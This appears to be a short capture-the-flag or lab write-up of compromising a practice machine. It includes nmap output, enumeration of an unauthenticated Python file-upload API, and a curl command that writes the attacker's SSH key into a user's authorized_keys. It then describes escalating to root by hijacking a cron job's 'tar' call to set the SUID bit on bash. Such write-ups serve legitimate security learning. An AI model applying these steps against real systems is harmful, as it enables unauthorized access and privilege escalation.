?$ nmap $ip -p- -sC -sV -oA initial
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-19 06:37 +0000
Nmap scan report for 192.168.52.249
Host is up (0.00036s latency).
Not shown: 65524 filtered tcp ports (no-response)
PORT      STATE  SERVICE          VERSION
21/tcp    open   ftp              vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.49.52
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    closed ssh
111/tcp   closed rpcbind
139/tcp   closed netbios-ssn
443/tcp   closed https
445/tcp   closed microsoft-ds
2049/tcp  closed nfs
10000/tcp closed snet-sensor-mgmt
25022/tcp open   ssh              OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)
|_  256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)
33414/tcp open   http             Werkzeug httpd 2.2.3 (Python 3.9.13)
|_http-server-header: Werkzeug/2.2.3 Python/3.9.13
|_http-title: 404 Not Found
40080/tcp open   http             Apache httpd 2.4.53 ((Fedora))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.53 (Fedora)
|_http-title: My test page
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 146.77 seconds





dirbuster
http://192.168.52.249:33414
/help
GET /info : General Info"
1	"GET /help : This listing"
2	"GET /file-list?dir=/tmp : List of the files"
3	"POST /file-upload : Upload files"

/file-list?dir=/tmp 	
0	"flask.tar.gz"
1	"systemd-private-0c7fad6e129b45c39aa0762612d7b03d-httpd.service-mjMDzW"
2	"systemd-private-0c7fad6e129b45c39aa0762612d7b03d-systemd-logind.service-ve1fMD"
3	"systemd-private-0c7fad6e129b45c39aa0762612d7b03d-ModemManager.service-P127VQ"
4	"systemd-private-0c7fad6e129b45c39aa0762612d7b03d-chronyd.service-hs7WPF"
5	"systemd-private-0c7fad6e129b45c39aa0762612d7b03d-dbus-broker.service-XE62Fp"
6	"systemd-private-0c7fad6e129b45c39aa0762612d7b03d-systemd-resolved.service-O6dxPH"
7	"systemd-private-0c7fad6e129b45c39aa0762612d7b03d-systemd-oomd.service-tasz5j"

http://192.168.52.249:33414/file-list?dir=/home
0	"alfredo"

/info
0	"Python File Server REST API v2.5"
1	"Author: Alfredo Moroder"
2	"GET /help = List of the commands"

curl -X POST http://192.168.52.249:33414/file-upload -H "Content-Type: multipart/form-data" -F "file=@/home/kali/.ssh/id_rsa.txt" -F "filename=/home/alfredo/.ssh/authorized_keys"
posted public ssh key into alfredo user

<img width="692" height="163" alt="image" src="https://github.com/user-attachments/assets/d541fc28-065f-4cd2-8dde-1bf027278afa" />

linpeas found vulnerable cronjob
<img width="479" height="68" alt="image" src="https://github.com/user-attachments/assets/421b31bc-d805-4ac1-8922-de230a807a22" />

this is the cron
<img width="440" height="91" alt="image" src="https://github.com/user-attachments/assets/4e1088ff-480a-42a9-9f41-7d953f504c37" />

it runs tar in the restapi folder. so we create an executable file called tar that gives suid bit to bin bash
<img width="579" height="132" alt="image" src="https://github.com/user-attachments/assets/e264afe0-ba45-4347-902c-83ec5571c94a" />


http://192.168.52.249:40080 (Rabbit hole, aka nothing)
/images
mozilla img

/styles
css page

/LICENSE
license details


KEY TAKE AWAYS:
uploading files using curl
uploading public rsa key to ssh in
linpeas to find priv esc
exploiting cronjobs
                                                                                                          
